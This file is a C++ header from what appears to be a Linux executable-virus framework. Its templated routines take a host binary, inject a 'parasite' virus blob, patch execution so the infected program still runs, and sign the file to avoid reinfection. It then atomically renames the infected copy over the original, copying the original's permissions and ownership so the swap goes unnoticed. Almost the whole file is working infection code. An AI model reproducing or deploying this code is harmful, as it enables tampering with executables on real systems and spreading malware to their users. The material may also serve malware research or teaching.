#pragma once
#include <linux/limits.h>
#include <stdlib.h>
#include <span>
#include "common/file_descriptor.hh"
#include "common/mmap.hh"
#include "nostdlib/stdio.hh"
#include "nostdlib/string.hh"

namespace vf::infector {

// Infect a host with a virus. We will make a copy of the host temporarily
// that will be modified and then replace the original.
// @param host_mapping The host executable
// @param parasite_mapping The virus binary blob.
// @param tmp_file_name The temporary file name used for modification
// @param parasite_patch_offset The offset in the infected file to be patched
// so we can continue running the infected host.
// @return A file descriptor for the infected host.
template <typename InfectorT, typename RedirectorT, typename SignerT>
common::FileDescriptor infect(std::span<const std::byte> host_mapping,
                              std::span<const std::byte> parasite_mapping,
                              const char* tmp_file_name,
                              size_t parasite_patch_offset) {
  if (SignerT::has_signature(host_mapping)) {
    // Do not infect again
    return {};
  }
  InfectorT infector;

  if (!infector.analyze(host_mapping, parasite_mapping)) {
    return common::FileDescriptor{};
  }

  common::FileDescriptor output(
      tmp_file_name, DO_NOT_OPTIMIZE_CONSTANT(O_RDWR | O_CREAT), S_IRWXU);

  if (!output.valid()) {
    return output;
  }

  auto infected_host_size = infector.injected_host_size();
  vf::ftruncate(output.handle(), infected_host_size);

  common::Mmap<PROT_READ | PROT_WRITE> output_host_mapping(
      infected_host_size, MAP_SHARED, output.handle(), 0);

  // Make a writable copy of the host.
  vf::memcpy(output_host_mapping.mutable_base(), &host_mapping.front(),
             host_mapping.size());

  auto output_victim = std::span<std::byte>(output_host_mapping.mutable_base(),
                                            output_host_mapping.size());
  auto result = infector.inject(output_victim, parasite_mapping);
  if (!result || !RedirectorT{}(result->parasite_entry_address,
                                result->parasite_file_offset,
                                parasite_patch_offset, output_victim)) {
    // infection failed, close and remove the temporary file.
    output = {};
    (void)vf::unlink(tmp_file_name);
  } else {
    SignerT::sign(output_victim);
  }

  return output;
}

// Atomically swap two files. It is used to replace the original host binary
// with an infected one. We also make sure that file metadata matches.
// @param host_fd The host file descriptor for the original file.
// @param host The host file name.
// @param temp_fd The temporary copy which contains the infected host.
// @param tmp The file name of the temporary copy.
// @return True if the swap is successful.
bool atomic_swap_host(int host_fd, const char* host, int tmp_fd,
                      const char* tmp) {
  // mimic the original file.
  struct stat s;
  if (vf::fstat(host_fd, &s) < 0) {
    return false;
  }
  if (vf::fchmod(tmp_fd, s.st_mode) < 0) {
    return false;
  }
  if (vf::fchown(tmp_fd, s.st_uid, s.st_gid) < 0) {
    return false;
  }
  // atomic swap and replace the original host with our infected one.
  if (vf::rename(tmp, host) < 0) {
    return false;
  }
  return true;
}

// A generic infection routine, that can be used by any algorithms.
// It creates a temp copy of the host, infects it with a parasite, and then
// pretend to be the host with atomic rename.
// @param host_path The path to a host that will be infected.
// @param parasite_path The path to a virus binary blob.
// @param parasite_patch_offset The offset of the instruction with in an
// infected binary that must be patched to return control flow back to the
// host binary after running the virus.
template <typename InfectorT, typename RedirectorT, typename SignerT>
bool infect(const char* host_path, const char* parasite_path,
            size_t parasite_patch_offset) {
  // host analysis phase, quick bailout if it cannot be infected.
  common::FileDescriptor host(host_path, O_RDONLY);
  if (!host.valid()) {
    return false;
  }
  auto host_size = host.file_size();
  common::Mmap<PROT_READ> host_mapping(host_size, MAP_SHARED, host.handle(), 0);

  common::FileDescriptor parasite(parasite_path, O_RDONLY);
  if (!parasite.valid()) {
    return false;
  }
  common::Mmap<PROT_READ> parasite_mapping(parasite.file_size(), MAP_SHARED,
                                           parasite.handle(), 0);

  char tmp[PATH_MAX];
  auto len = vf::strlen(host_path);
  vf::strcpy(tmp, host_path);
  tmp[len] = '.';
  tmp[len + 1] = '\0';
  auto output_fd = infect<InfectorT, RedirectorT, SignerT>(
      std::span<const std::byte>(host_mapping.base(), host_mapping.size()),
      std::span<const std::byte>(parasite_mapping.base(),
                                 parasite_mapping.size()),
      tmp, parasite_patch_offset);

  if (!output_fd.valid()) {
    return false;
  }
  return atomic_swap_host(host.handle(), host_path, output_fd.handle(), tmp);
}
}  // namespace vf::infector